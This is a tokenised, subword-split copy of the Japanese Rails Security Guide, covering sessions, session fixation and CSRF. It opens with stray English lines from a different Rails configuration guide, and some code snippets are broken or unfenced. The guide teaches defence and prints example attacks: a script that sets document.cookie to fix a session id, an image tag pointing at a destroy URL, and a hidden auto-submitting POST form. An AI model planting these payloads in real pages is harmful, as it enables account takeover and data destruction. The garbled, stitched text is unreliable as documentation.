▁C on fig ur ing ▁Rails ▁ Application s < n > = = = ========= ========= ========= < n >
▁This ▁ guid e ▁ co ver s ▁the ▁config ur ation ▁and ▁ initial i z ation ▁f e at ur es ▁ available ▁to ▁Rails ▁ application s .
▁A f ter ▁ read ing ▁this ▁ guid e , ▁you ▁ will ▁ k now :
▁Rails ▁ セキュリティ ガイド
▁= ========= ========= =========
▁この マ ニ ュ ア ル では 、 Web アプリケーション 全 般 における セキュリティ の 問題 と 、 Rails で それらの 問題 を 回 避 する方法について 説明します 。
▁この ガイド の内容 :
▁* ▁ _ 本ガイドで 取り上げ られ ている 問題 _ ▁ に対する あらゆる 対策
▁* ▁Rails における セッション の 概念 、 セッション に含まれる 項目 、 セッション に対して 行 わ れ ること の 多 い 攻撃
▁* ▁Web サイト を開く だけで セキュリティ 問題 が発生する しく み ▁( CSRF )
▁* ▁ ファイルの 取 扱 い 上の 注意 、 管理 インターフェイス を 提 供 する 際 の 注意
▁* ▁ い か に ユーザーを 管理 すべき か ▁( ログイン / ログアウト の しく み 、 あらゆる レ イ ヤ における 攻撃 方法 の 解 説 )
▁* ▁ 最も よく 知 られ た インジェクション 攻撃 の 手法
▁ ---------------- ---------------- ---------------- ---------------- ----------------
▁ は じ め に
▁- -----------
▁Web アプリケーション フレームワーク は 、 Web アプリケーションを 容易に 開発 できるように するために 作 られ ました 。
▁その 中に は セキュリティ を 比 較 的 高 め やすい フレームワーク もあります 。
▁ 実際の ところ 、 ある フレームワーク は 他の よりも 安全 である ということ は 一 概 には 言 え ません 。 正しく 用 いる ことができ ている のであれば 、 たい て い の フレームワーク で 安全 な Web アプリケーションを 構 築 できます ▁( 逆 に 言 えば 、 正しく 用 い られ て い なければ どんな Web アプリケーションを 採 用 し よう とも 安全 を 保 つ ことはできません )。
▁Ruby ▁on ▁Rails には 、 こう した 問題 が 大 事 に 至 ら ないように セキュリティ を 保 つ ための 便利な ヘルパーメソッド ▁( SQL インジェクション 対策 用 など ) ▁ が いくつか 用意されてい ます 。
▁ 一般に 、 導入 する だけで た ち ま ち セキュリティ を 保 つ ことができる ような 便利な もの はありません 。
▁ セキュリティ は 、 フレームワーク を使用する 人 間 に 強 く 依 存 します 。 場合によっては 開発 方法 も セキュリティ に 影 響 する ことがあります 。
▁ セキュリティ は 、 Web アプリケーション を構成する あらゆる 階層 ▁( バ ッ ク エ ンド の スト レ ー ジ 、 Web サーバー 、 Web アプリケーション 自身 、 他の 階層 など ) ▁ に 依 存 しています 。 ど れ か 一 つの 階層 に 問題 があれば 、 他の 階層 が ど れ だけ 堅 固 であっても 全体 の セキュリティ は その 問題 のある 階層 の レベル に まで 落 ち てしまいます 。
▁ G ar t n er ▁ G r o up は 、 攻撃 の 7 5 % が Web アプリケーション 層 に対して 行われている と 見 積 も っ ており 、 監 査 を 受け た 3 00 の Web サイト のうち 9 7 % が 脆弱性 を 抱 え ている という 結果を 得 ています 。
▁これは 、 Web アプリケーション に対する 攻撃 は 比 較 的 行 い や す く 、 一 般 人 であっても 理解 や 操作 が 可能な ほど に Web アプリケーション が シ ン プ ル である ためです 。
▁Web アプリケーション に対する 脅 威 には 、 ユーザー アカウント の ハイジャック 、 アクセス 制 御 の バ イ パス 、 機 密 データ の 読み出し 、 不 正 な コンテンツ の 表示 など 、 さまざまな もの があります 。
▁さらに 、 攻撃者が 金 儲 け または 企 業 資 産 の 改 ざ ん による 企 業 イ メ ー ジ 損 壊 の 目的 で 、 ト ロ イ の 木馬 プログラム や 迷 惑 メール 自動 送信 プログラム を 仕 込 んだ り すること も あり え ます 。
▁ このような 攻撃 を 防 ぎ 、 影 響 を 最 小 限 に と ど め 、 攻撃 され やすい ポ イン ト を 除 去 するために は 、 敵 の 攻撃 方法 を 完全に 理解 しておくこと が 何 よりも 必要 です 。 そう でない と 、 正しい 対策 を 取 ること が できません 。
▁ 以上 が 本 ガイド の 目的 です 。
▁ 安全 な Web アプリケーションを 開発 するために 必要な のは 、 すべての 階層 を 最新の 状態 に 保 つ こと 、 そして 敵 を 知 ること です 。
▁ 追加 資 料
▁ セッション
▁ ---- ----
▁ セッション は 、 セキュリティ に関する 考 察 を 始 め る の に お あ つ ら え 向 き です 。 セッション は ある 種 の 攻撃 の 対象 になる ことがあります 。
▁### ▁ セッション とは 何か
▁NOT E : ▁ _ HTTP は ス テ ート レ ス の プロトコル です 。
▁ セッション は 、 これを ス テ ート フル に 変え る ものです 。
▁ シ ョ ッ ピ ング サイトの 買 い 物 カ ゴ や 、 現在 ログイン している ユーザーの id など が これ に 該 当 します 。
▁ セッション という 概念 が なければ 、 ユーザーの 識 別 ・ 認 証 を リクエストを 発行する たびに 行 わ なければ なら なくなります 。
▁Rails は 、 ユーザーが アプリケーションに 新しく アクセス するときに 自動的に セッション を作成します 。
▁ ユーザーが 既に アプリケーション を使用 中 であれば 、 既存の セッション を 読み込み ます 。
▁ 通常 、 セッション を構成する 要素 は 、 値 の ハッシュ と セッション id です 。 セッション id は 3 2 文字 の 文字列 で 、 ハッシュ を 特 定 するために 使用します 。
▁ クライアント の ブラウザに送信 される Co o k i e には 、 常に セッション id が 含まれています 。
▁ 別の 見 方 を すると 、 ブラウザ は クライアント から リクエストを 送信 する たびに cookie を送信し ます 。
▁Rails では 、 セッション メソッドを使用して 値 の 保存 と 取り出し を行なう ことができます 。
▁` ` ` ruby
▁ session [: user _ id ] ▁= ▁@ current _ user . id
▁User . find ( session [: user _ id ] )
▁### ▁ セッション id
▁NOT E : ▁ _ セッション id は 、 3 2 バ イ ト の M D 5 ハッシュ 値 です 。
▁1 つの セッション id は 、 ランダム な 文字列 の ハッシュ 値 で 構成 されています 。
▁この ランダム な 文字列 は 、 現在 時刻 、 0 から 1 まで の 乱 数 、 Ruby イン ター プ リ タ の プロセス id ▁( これ も 基本的に は 乱 数 です ) 、 および 一 定 の 文字列 です 。
▁ 現時点では 、 Rails の セッション id に ブ ルート フ ォ ー ス 攻撃 を行なう ことは 不 可能です 。
▁ M D 5 は 現在 まで 破 られ て いません が 、 若 干 の 衝 突 が発生し ている ため 、 同じ ハッシュ 値を 異なる 入力 テキスト から 生成 すること は 「 理 論 的に は 」 不 可能 ではありません 。
▁しかし これ が セキュリティ上の 脅 威 になった ことは これまで ありません 。
▁### ▁ セッション ハイジャック
▁WARN ING : ▁ _ ユーザーの セッション id が 盗 まれ ると 、 攻撃者が その ユーザーを か た って Web アプリケーション を使用 できてしまいます 。
▁ 多くの Web アプリケーション には 何らかの 認証システム があります 。 ユーザーが ユーザー名 と パスワード を入力する と 、 Web アプリケーション は それら を チェック して 、 対応する ユーザー id を セッション ハッシュ に保存 します 。
▁ 以後 、 その セッション は 有効 になります 。
▁ リクエスト が行われ る たびに 、 Web アプリケーション は セッション で 示 された ユーザー id を持つ ユーザーを 読み込み ます 。 このとき に 再度 認 証 を行なう 必要はありません 。
▁ セッション は 、 cookie 内の セッション id によって 識 別 できます 。
▁この ように 、 cookie は Web アプリケーションに 一時 的な 認 証 機能を 提供し ています 。
▁ 他 人 の cookie を 奪 い 取 る ことができ れば 、 その ユーザーの 権限 で Web アプリケーション を使う ことができ てしまいます 。 これ によって おそらく 深 刻 な 結果 が 生じる 可能性があります 。
▁ セッション ハイジャック の 手法 と 対策 を いくつか ご 紹 介 します 。
▁* ▁ セキュリティ に 不 備 のある ネットワーク では cookie を 覗 き 見 すること が できてしまいます 。
▁ 無 線 L A N は 、 ま さ に そのような ネットワーク の 一 例 です 。
▁ 接続 されている クライアント の すべての ト ラ フ ィ ッ ク を の ぞ き 見 ること は 、 暗号化 されていない 無 線 L A N では 特に 簡単に 行なう ことができます 。
▁Web アプリケーションの 開発者 にとって は 、 これは ▁ _ SSL による 安全 な 接続 の 提 供 _ ▁ が 必要 である ということです 。
▁Rails ▁ 3.1 以降 では 、 アプリケーションの 設定 ファイル で SSL 接続 を 強 制 すること によって 達 成 できます 。
▁` ` ` ruby
▁config . force _ s s l ▁= ▁true
▁` ` `
▁* ▁ 公 共 の 端 末 で の 作業 後に cookie を 消 去 する ような 殊 勝 な ユーザー は ほとんど いません 。
▁ 最後の ユーザーが Web アプリケーション から ログアウト する の を 忘れ て 立 ち 去 って い たら 、 次の ユーザー は その Web アプリケーションを そのまま 使 え てしまいます 。
▁ユーザー には ▁ _ ログアウト ボタン _ ▁ を 提供し なければなりません 。 それ も ▁ _ よく 目 立 つ ボタン _ ▁ を 。
▁* ▁ ク ロ ス サイト ス ク リ プ テ ィ ング ▁( XSS ) ▁ 攻撃 は 、 多くの 場合 、 ユーザーの cookie を 手 に 入 れる の が 目的 です 。
▁* ▁ 攻撃者が 自分の 知 らない cookie を わざわざ 盗 み 取 る 代りに 、 自分 が 知 っている cookie の セッション id を 固定 してしまう という 攻撃 方法 もあります 。
▁詳細については 後 述 の セッション 固定 に関する 記述 を参照してください 。
▁ たい て い の場合 、 攻撃者 の 目的 は 、 金 儲 け です 。
▁[ S y ma n te c ▁ G lo b al ▁ In ter net ▁S ec ur ity ▁ T h re at ▁ Re port ]( http :// eval . s y ma n te c . com / m k t g info / ent er p ri s e / w h it e _ p a per s / b - w h it e p a per _ in ter net _ security _ th re at _ re port _ x i i i _ 04 - 200 8 . en - us . p d f ) による と 、 盗 まれ た 銀 行 口 座 アカウント の 闇 価 格 は 、 利用 可能な 資 金 にも より ます が だ いた い $ 10 から $ 1 000 ぐらい 、 ク レ ジ ッ ト カ ー ド 番号 が $ 0 . 4 0 から $ 20 ぐらい 、 オンライン オ ー ク ション サイトの アカウント が $ 1 から $ 8 ぐらい 、 電 子 メールの パスワード が $ 4 から $ 30 く ら い だ そう です 。
▁### ▁ セッション の 取り 扱 い に関する ガイド ラ イン
▁ セッション を 取り 扱 う 際 の 一般的な 注意 について解説します 。
▁* ▁ _ セッション には 巨 大 な オブジェクトを 格 納 し ないこと _ 。
▁ そのような 大きな データ は サーバー 側 の データベースに 格 納 する ように し 、 セッション には その id だけ を保存し てください 。
▁ こうすることで 、 同 期 に 関 して 悩 まず に 済み 、 セッション の スト レ ー ジ 容 量 が あ ふ れる ことも ありません ( セッション の 格 納 先 を ど こ に するか にも より ます が : ▁ 後 述 )。
▁この 方法は 、 オブジェクトの 構造 を変更 し 、 変更 前 の 古 い オブジェクトが 一部の ユーザー によって まだ 使用されている ような 場合に も 有 用 です 。
▁ セッション が サーバー 側 で 保存 され ていれば セッション を 消 去 する のは 容 易 ですが 、 セッション が クライアント 側 に 格 納 されている と 、 それ を 制 御 する のは 厄 介 です 。
▁* ▁ _ セッション に 重要な データ を保存し ないこと 。 _
▁ ユーザーが cookie を 消 去 したり ブラウザを閉じ たり すると 、 それらの 情報 が 失 わ れ てしまいます 。
▁ しか も 、 その セッション が クライアント 側 に保存 されている と 、 ユーザーが その データを 読 む ことができ てしまいます 。
▁### ▁ セッション スト レ ー ジ
▁NOT E : ▁ _ Rails には セッション ハッシュ を 保存 す ための しく み が 複 数 用意されてい ます 。
▁ 中 でも 最も 重要な の が ` ActionDispatch :: Session :: Co o k i e S to re ` です 。
▁Rails ▁2 で Co o k i e S to re という 新しい デフォルト セッション スト レ ー ジ が 導入 されました 。
▁C oo k i e S to re は セッション ハッシュ を直接 クライアント 側 の cookie に保存 します 。
▁ サーバー は その cookie から セッション ハッシュ を 読み 出 す ことで 、 セッション id を使用 せずに 済み ます 。
▁これ によって サーバー の 速 度 は 大きく 向 上 します が 、 この スト レ ー ジ オプション には セキュリティ上の 論 争 が 絶 え ず 発生 し ており 、 導入 に あ た って は セキュリティ に 与え る 影 響 を 十分 考 慮 しておく必要があります 。
▁* ▁C oo k i e の サイズ は 4 ▁ K B と 厳 密 に 定 め られ ています 。
▁ _ 通常 通 り 、 現在のユーザー の データベース id を セッション に保存 すること には 問題 ありません 。 _
▁* ▁C oo k i e に保存 されている のは 平 文 テキスト ▁( 実際には Base 64 で エンコード されて ます が 暗号化 は されて ません ) ▁ なので 、 セッション に保存 されている 情報 は その 気 に な れば すべて クライアント 側 で 読み 取り 可能です 。
▁ ここ から も わ か る とおり 、 _ い か な る 機 密 情報を も cookie に保存 すべき ではありません _ 。
▁ サーバー 側 では 、 セッション が 改 竄 される こと を防ぐ ために 、 サーバー 上の 秘 密 キー を元に セッション から ダイジェスト を 計算 して それ を cookie の 末尾 に 挿 入 しています 。
▁つまり 、 cookie の スト レ ー ジ の ( 改 竄 防止 の ) セキュリティ はこの サーバー 上の 秘 密 キー ▁( および ダイジェスト の ア ル ゴ リ ズ ム ▁-- ▁ 互 換 性 の ため デフォルトで は S H A 1 を使用 ) ▁ に か か っています 。
▁従って 、 _ 秘 密 キー には 安 易 な もの ( 辞 書 から 抽 出 した 単 語 や 、 30 文字 より 短 い 文字列 ) を使用 すべき ではありません 。 _
▁` secret s . secret _ key _ base ` メソッドは 、 改 竄 防止 のために 、 アプリケーションの セッション を 既 知 の 秘 密 キー と 照 合 するための キー を指定する ときに 使い ます 。
▁ アプリケーション は ` secret s . secret _ key _ base ` を使用して 、` config / secret s . yml ` など に保存 される キー を ランダム に 初期化 します 。
▁ development :
▁ secret _ key _ base : ▁a 7 5 d ...
▁test :
▁ secret _ key _ base : ▁4 9 2 f ...
▁ production :
▁ secret _ key _ base : ▁<%= ▁ ENV [ " S E C RE T _ K E Y _ BASE "] ▁%>
▁ 古 い バージョンの Rails では Co o k i e S to re が 使用 され ていました 。 これは E n c ry p t ed Co o k i e S to re で 使用される ` secret _ key _ base ` ではなく 、` secret _ token ` を使用します 。
▁詳細については 、 Rails の アップグレード に関する ドキュメント を参照してください 。
▁ 秘 密 キー が 一般に さ ら された アプリケーション ▁( ソース が 公開 されている アプリケーション など ) ▁ を 受け 取 った 場合 、 そのまま 使用 せ ず 、 必ず 秘 密 キー を変更 するようにしてください 。
▁### ▁C oo k i e S to re セッション に対する 再 生 攻撃
▁ TIP : ▁ _ ` Co o k i e S to re ` を扱う のであれば 、 もう 一 つの 攻撃 方法 である 「 再 生 攻撃 ▁( re p la y ▁a tt ack )」 についても 知 っ ておく 必要があります 。
▁この 動作 は 次の ようになります 。
▁* ▁ ユーザーが ク レ ジ ッ ト を 受け 取 る 。 総 額 は セッション に保存 されている ▁( もちろん これ が ダ メ ダ メ な のは わ か っています 。 あ く まで 説明 の ためのものです )。
▁* ▁ ユーザーが ク レ ジ ッ ト で 何か を 購 入 する 。
▁この 再 生 攻撃 は 、 セッション に n on ce ▁( 1 回 限 り の ランダム な 値 ) ▁ を含め ておく ことで 防 ぐ ことができます 。
▁ n on ce が 有効な のは 1 回 限 り であり 、 サーバー は n on ce が 有効 かどうかを 常に 追 跡 し 続 け る必要があります 。
▁ 複数の アプリケーション サーバー で 構成 された 、 合 い の 子 アプリケーション の場合 、 さらに 複 雑 になります 。
▁ n on ce を データベースに保存 してしまう と 、 せ っ か く データベース への アクセス を避ける ために 設 置 した Co o k i e S to re を使用する 意味 が なく な ってしまいます 。
▁ 結 論 から 言 う と 、 ▁ _ この種の データ は セッション ではなく データベースに保存 する _ ▁ の が 最 善 です 。
▁ この場合 であれば 、 ク レ ジ ッ ト を データベースに保存 し 、 logged _ in _ user _ id を セッション に保存 します 。
▁### ▁ セッション 固定 攻撃
▁NOT E : ▁ _ ユーザーの セッション id を 盗 む 代りに 、 攻撃者が 意 図 的に セッション id を 既 知 の もの に 固定 する という 方法 があります 。
▁この 手法 は セッション 固定 ▁( session ▁ fi x ation ) ▁ と 呼ばれ ます 。
▁ Session ▁ fi x ation ]( images / session _ fi x ation . png )
▁この 攻撃 では 、 ブラウザ 上の ユーザーの セッション id を 攻撃者が 知 っている セッション id に 密 か に 固定 しておき 、 ブラウザ を使う ユーザーが 気 付 か ない う ち に その セッション id を 強 制 的に 使 わ せ ます 。
▁この 方法 であれば 、 セッション id を 盗 み 出 す 必要 す ら ありません 。
▁ 攻撃 方法は 次の とおりです 。
▁* ▁ 攻撃者 は 有効な セッション id を生成します 。 Web アプリケーションの ログイン ページ ▁( つまり セッション 固定 攻撃 の 対象 ページ ) ▁ を 開 き 、 レスポンス に含まれる cookie から セッション id を取り出し ます ▁( 図 の 1 と 2 を参照 )。
▁ 同 一 生成 元 ポ リ シ ー の 制限 によって 、 外部 ドメイン から 標的ユーザー の cookie を変更 できない の が 普通 なので 、 攻撃者 は Web サーバー の ドメイン を経由して JavaScript を 標的ユーザー の ブラウザ に 送 り 込 んで 読み 込 ま せ ます 。
▁ ク ロ ス サイト ス ク リ プ テ ィ ング ▁( XSS ) ▁ によって JavaScript コードの 注 入 ▁( インジェクション ) ▁ に 成功 すれば 、 攻撃 は 完了 です 。
▁ セッション id の例 : ▁` < script > document . cookie =" _ session _ id = 16 d 5 b 7 8 a b b 28 e 3 d 6 2 06 b 6 0 f 22 a 0 3 c 8 d 9 " ; </ script > ` 。
▁ XSS と インジェクション の詳細については 後 述 します 。
▁* ▁ 攻撃者 は 、 JavaScript を 仕 込 んだ ページに 標的ユーザー を 誘 い 込 み ます 。
▁ 標的ユーザー が ブラウザで ページ を開く と 、 その ユーザーの セッション id が 攻撃者 の 仕 込 んだ もの と 差 し 替 え られます 。
▁* ▁ 仕 込 まれ た セッション id で の ログイン が その ブラウザで は 行 わ れ て い なかった ので 、 Web アプリケーション は ユーザーに 認 証 を 要求 します 。
▁* ▁ 認 証 が 完了 すると 、 標的ユーザー と 攻撃者 は 同じ セッション を 共有 した 状態 になります 。 この セッション は 有効 であり 、 標的ユーザー は 攻撃 された ことに も 気 付き ません 。
▁### ▁ セッション 固定 攻撃 ▁- ▁ 対応策
▁ TIP : ▁ _ セッション 固定 攻撃 は 、 た った 1 行 のコード で 防止 できます 。
▁ 最も 効果 的な 対応策 は 、 ログイン 成功 後に 古 い セッション を 無効 に し 、 ▁ _ 新しい セッション id を 発行する _ ▁ ことです 。
▁これ なら 、 攻撃者が セッション id を 固定 する 余 地 はありません 。
▁この 対応策 は 、 セッション ハイジャック にも 有効 です 。
▁Rails で 新しい セッション を作成する 方法 を以下に示します 。
▁ reset _ session
▁ユーザー 管理 用 に 、 有 名 な Re st f ul A u the n tic ation プラグイン を導入し ている のであれば 、 Session Control # create アクションに reset _ session を追加し てください ▁( 訳 注 : ▁20 15 年 8 月 現在 、 プラグイン 機 構 は あ まり 使われ ており ません )。
▁このメソッド を実行すると セッション から すべての 値が 削除 され てしまいます ので 、 ▁ _ 新しい セッション に それらの 値を 移 行 しておく必要があります 。 _
▁その 他の 対応策 として 、 _ セッション に ユーザー 固有の プロ パ テ ィ を 保存 しておき 、 _ ▁ユーザー から リクエストを 受け る たびに 照 合 して 、 マッチ し ない場合は アクセス を 拒 否 する という 方法 もあります 。
▁ユーザー 固有の プロ パ テ ィ として 利用 可能な 情報 には 、 リモート I P アドレス や ▁ user ▁a g ent ▁( = ▁ web ブラウザ の名前 ) ▁ があります が 、 後 者 は 完全に ユーザー 固 有 とは 限 り ません 。
▁I P アドレス を保存し て 対応する 場合 、 イン ター ネ ッ ト サービス プロ バ イ ダ ▁( I S P ) ▁ や 大 企 業 から の アクセス は プロキシ 越 し に 行われている こと が多い ことを 忘れ ないように しておく必要があります 。
▁ _ I P アドレス は セッション の 過 程 で 変わる 可能性 がある _ ▁ ため 、 I P アドレス を ユーザー 固有の 情報 として 使用 し よう と すると 、 ユーザーが Web アプリケーション にアクセス でき なく な った り 、 ユーザーの 使用 に 制限 が 加 わ る 可能性があります 。
▁### ▁ セッション の 期限切れ
▁NOT E : ▁ _ セッション を 無 期 限 に すると 、 攻撃 される 機 会 を 増 や し てしまいます ▁( ク ロ ス サイト リクエスト フ ォ ー ジ ェ リ ▁( CSRF ) 、 セッション ハイジャック 、 セッション 固定 など )。
▁ セッション id を持つ cookie の タイムスタンプ に 有効 期 限 を設定する という 対応策 も 考え られ なく はありません 。
▁しかし 、 ブラウザ 内に 保存 されている cookie を ユーザーが 編集 でき てしまう 点 は 変 わ ら ないので 、 や は り サーバー 側 で セッション を 期限切れ にする 方が 安全 です 。
▁ _ データベース テーブル の セッション を 期限切れ にする _ . ▁ には 、 たとえば 次のように 行います 。
▁` Session . s w e e p (" 20 ▁ minute s ") ` を 呼 ぶ と 、 20 分 以上 経 過 した セッション が 期限切れ になります 。
▁class ▁ Session ▁< ▁ActiveRecord :: Base
▁def ▁self . s w e e p ( time ▁= ▁1. hour )
▁if ▁ time . is _ a ? (
▁ time ▁= ▁ time . s p li t . in j e ct ▁ { ▁| count , ▁ un it | ▁ count . to _ i . s end ( un it ) ▁ }
▁end
▁ delete _ all ▁" updated _ at ▁< ▁' # { time . ago . to _ s (: db ) } ' "
▁end
▁この節では 、 セッション 保 持 の 問題 の ところで 触 れ た セッション 固定 攻撃 について説明し ます 。
▁ 攻撃者が 5 分 お き に セッション を 維 持 すると 、 サーバー 側 で セッション を 期限切れ に し よう として も セッション を 恒 久 的に 継 続 させる ことができ てしまいます 。
▁これ に対する 単純な 対策 は 、 セッション テーブル に created _ at カラム を追加する ことです 。
▁これで 、 期 限 を 過 ぎ た セッション を 削除 できます 。
▁上の s w e e p メソッドで 以下のコード を使用します 。
▁ delete _ all ▁" updated _ at ▁< ▁' # { time . ago . to _ s (: db ) } ' ▁OR
▁ created _ at ▁< ▁' # { 2 . day s . ago . to _ s (: db ) } ' "
▁ ク ロ ス サイト リクエスト フ ォ ー ジ ェ リ ▁( CSRF )
▁- ---------------- ----------------
▁この 攻撃 方法は 、 ユーザー による 認 証 が完了し た と 考え られ る Web アプリケーションの ページに 、 悪意のある コード や リンクを 仕 込 む という ものです 。
▁その Web アプリケーション への セッション が タ イ ム ア ウ ト して い なければ 、 攻撃者 は 本 来 認 証 されていない は ず の コマンド を 実行 できてしまいます 。
▁このとき 、 セッション id を cookie に保存 して サーバー 側 に セッション ハッシュ を持つ か 、 すべての セッション ハッシュ を クライアント ▁( ブラウザ ) ▁ 側 に 持 ち ます 。
▁ どちら の場合 にも 、 ブラウザ は リクエスト の たびに cookie を 自動的に ドメイン に 送信 します ▁( その ドメイン で 使用できる cookie がある場合 )。
▁ここで 問題 となる のは 、 異なる ドメイン に 属 する サイト から リクエスト が あった 場合に も ブラウザ が cookie を送信し てしまう という 点 です 。
▁以下の 例 で 考えてみましょう 。
▁* ▁ ボ ブ は 掲 示 板 を ブラウザで 眺 め て いて 、 と ある ハ ッ カ ー による 書き 込 み を 目 に します 。 その 書き 込 み には 仕 掛 け のある HTML ▁ image 要素 が 含まれています 。
▁その 要素 が 実際に 参 照 している のは 、 画像 ファイル ではなく 、 ボ ブ の プロジェクト 管理 アプリケーションを 標 的に した コマンド です 。
▁* ▁` < im g ▁src =" http :// www . web app . com / pro j e ct /1/ destroy "> `
▁* ▁ ボ ブ はこの 数 分 間 ログアウト していない ので 、 www . web app . com ▁ に対する ボ ブ の セッション はまだ 期限切れ になって いません 。
▁* ▁ ハ ッ カ ー による 書き 込 み が ブラウザで 表示される と 、 ブラウザ は image タグ を見つけ ます 。
▁ そして ブラウザ は ▁ www . web app . com ▁ から その 怪 しい 画像 を 読み 出 そう とします 。
▁ 前 述 の とおり 、 このとき に 有効な セッション id を含む cookie も 一 緒 に 送信 されます 。
▁* ▁ www . web app . com ▁ の Web アプリケーション は 、 リクエスト に対応する セッション ハッシュ に含まれる ユーザー情報 が 有効 である と 認 定 し 、 その 指示 に従って ID ▁1 の プロジェクト を削除し ます 。
▁ そして ブラウザ は 結果 ページを 表示 して 何らかの 問題が生じ た こと を示します 。 画像 は 表示 されません 。
▁* ▁ ボ ブ は 攻撃 に 気 付 いて いません 。 しかし 数 日 後に は プロジェクト No . 1 が 削除 されている ことを 知 ります 。
▁ここで 重要な のは 、 仕 掛 け のある 画像 や リンク の 置き場所 は Web アプリケーションの ドメイン に 限 らない ということです 。 フ ォ ー ラ ム 、 ブログ 、 email 、 ど こ に でも 置 け ます 。
▁ CSRF は 、 C V E ▁( Co m m on ▁ V ul n er a b il it ies ▁and ▁ E x p o s ur es ) ▁ で 報 告 される ことは め った に ありません ▁( 200 6 年 でも 0 . 1 % 以下 ) ▁ が 、 それ でも 「 眠 れる 巨 人 」 [ G r o s s ma n ] ▁ であり 、 危 険 な ことに 変 わ り はありません 。
▁### ▁ CSRF への 対応策
▁NOT E : ▁ _ 第 一 に 、 W 3 C が 要求 している とおり 、 GET と POST を 適切に 使用します 。
▁ 第 二 に 、 GET 以外の リクエスト に セキュリティ トークン を追加する ことで 、 Web アプリケーションを CSRF から 守 ることができます 。 _
▁ HTTP プロトコル は 2 つの 基本的な リクエスト である GET と POST を 提供し ています ▁( これ 以外の リクエスト も 制 定 されています が 、 大 半 の ブラウザで サポート されていません )。
▁ W or l d ▁ W id e ▁Web ▁C on s or t i um ▁( W 3 C ) ▁ は 、 HTTP の GET や POST を 選択 する 際 の チェック リスト を 提供し ています 。
▁** 以下の 場合は GET を使用すること **
▁* ▁その やりとり が 基本的に ▁ _ 質 問 _ ▁ である 場合 ▁( クエリ 、 読み出し 操作 、 検索 のような 安全 な 操作 )
▁** 以下の 場合は POST を使用すること **
▁* ▁その やりとり が 基本的に ▁ _ 命 令 _ ▁ である 場合 、 または
▁* ▁その やりとり によって リソース の ▁ _ 状態 が 変 わ り _ ▁ 、 その ことが ユーザーに わ か る 場合 ▁( サービス への 申 し 込 み など ) 、 または
▁* ▁その やりとり によって 生じる 結果 に対して ▁ _ ユーザーが 責 任 を持つ _ ▁ 場合 。
▁Web アプリケーション が RESTful であれば 、 PATCH 、 PUT 、 DELETE などの メソッド も 使用されている でしょう 。
▁しかし 、 現 時点 の ブラウザで は これらの メソッドは ほとんど サポート されていません 。 確 実 に サポート されている のは GET と POST だけです 。
▁Rails では ` _ method ` という 隠 し フィールド を使用して これらの メソッドを サポート しています 。
▁ _ POST リクエスト も ▁( 意 図 に 反 して ) ▁ 自動的に 送信 される こと があり え ます _ ▁ 。
▁ ブラウザ の ステータス バー に 、 www . ha rm less . com ▁という Web サイト へのリンク が表示されている とします 。
▁ そして この リンク には 仕 掛 け があり 、 POST リクエストを こ っ そ り 送信 する 新しい フォーム を 動的 に 作成する よう になっている とします 。
▁` ` ` html
▁< a ▁ href =" http :// www . ha rm less . com / " ▁on c li c k ="
▁ v ar ▁f ▁= ▁ document . create E le m ent (' form ') ;
▁f . style . d is p la y ▁= ▁' n one ' ;
▁this . parent No de . app end C h il d ( f ) ;
▁f . method ▁= ▁' POST ' ;
▁f . action ▁= ▁' http :// www . example . com / account / destroy ' ;
▁f . submit ( ) ;
▁ return ▁false ; "> To ▁the ▁ ha rm less ▁ s ur ve y </ a >
▁ あるいは 、 攻撃者が このコード を 画像 の on m o us e o ver イベント ハ ンド ラ に 仕 込 んで あるとします 。
▁< im g ▁src =" http :// www . ha rm less . com / im g " ▁ w id th =" 4 00 " ▁ h e ig h t =" 4 00 " ▁on m o us e o ver =" ... "
▁` < script > ` タグ を使用して 、 JSON P や JavaScript の 応答 を 伴 う 特定の URL への ク ロ ス サイト リクエスト を作成する など 、 攻撃 方法は 多 種 多 様 です 。
▁この 応答 は 攻撃者が 見つけ 出 す こと の できた 実行 可能な コード であり 、 機 密 データを 取り出す ことができる 可能性があります 。
▁ このような データ 流 出 を 防止 するには 、 ク ロ ス サイトの ` < script > ` タグ を 無効 に します 。
▁ JavaScript の 応答 を 行える のは Ajax リクエスト だけです 。 これは 、 Ajax リクエスト は ブラウザ の 「 同 一 生成 元 ポ リ シ ー 」 に従って 動作 し ており 、 自分 以外の サイト から リクエストを 開 始 できない ように 制限 されている ためです 。
▁ この種の 偽 造 リクエスト をすべて 防止 するには 、 ▁ _ 必 須 セキュリティ トークン _ ▁ を導入し ます 。 この トークン は 自分の サイト だけ が 知 っ ており 、 他の サイト は 知 り ません 。
▁ リクエスト には この セキュリティ トークン を含め 、 サーバー 側 で これを 検証 します 。
▁以下の 1 行 コードは アプリケーションの コントローラ に追加する もの であり 、 Rails で 新規作成 した アプリケーション には このコード が デフォルトで 含 まれ ます 。
▁ pro te ct _ from _ f org e ry ▁with : ▁: except ion
▁ このコード がある と 、 Rails で 生成される すべての フォーム と Ajax リクエスト に セキュリティ トークン が含まれ ます 。
▁ セキュリティ トークン が マッチ しない 場合には 例外 が ス ロー されます 。
▁ 恒 常 的な cookie に ユーザー情報 を保存する ▁( たとえば ` cookies . per ma n ent ` など に ) ▁ ことは よく 行 わ れ ています 。
▁ この場合 cookie は 消 去 され ない ことにご注意ください 。 そして 、 前 述 の 保 護 機 構 の 外 では CSRF から の 保 護 は 受け られ ない という ことになります 。
▁ 何らかの 理由 で このような 情報を セッション 以外の cookie スト ア に保存 したい のであれば 、 Rails による 保 護 を 受け られ ないこと になる ので 、 開発者 自身 が セキュリティ 対策 を 行 わ なければなりません 。
▁ re sc u e _ from ▁ ActionController :: In valid A u the n tic ity To ke n ▁do ▁| except ion |
▁ sign _ out _ user ▁# ▁ユーザーの cookie を削除する メソッド の例
▁ 前 述 の メソッドは ` Application Controller ` に置く ことができます 。 そして 、 非 GET リクエスト に CSRF トークン が ない場合 や トークン が 無効な 場合に このメソッド が 呼び出され ます 。
▁ 気 を 付け ていた だ き たい のは 、 ▁ _ ク ロ ス サイト ス ク リ プ テ ィ ング ▁( XSS ) ▁ 脆弱性 は 、 あらゆる CSRF 保 護 を 迂 回 してしまう _ ▁ ということです 。
▁ XSS 脆弱性 が存在する と 、 攻撃者 は Web ページの あらゆる 要素 にアクセス できてしまいます 。 そのため 、 フォーム から CSRF セキュリティ トークン を 読み だ して その フォーム を直接 送信 すること が できてしまいます 。
▁ リダイレクト と ファイル
▁--------- - -----------
▁ セキュリティ上の 脆弱性 として 次に 検 討 したい のは 、 Web アプリケーション における 「 リダイレクト と ファイル 」 です 。
▁### ▁ リダイレクト
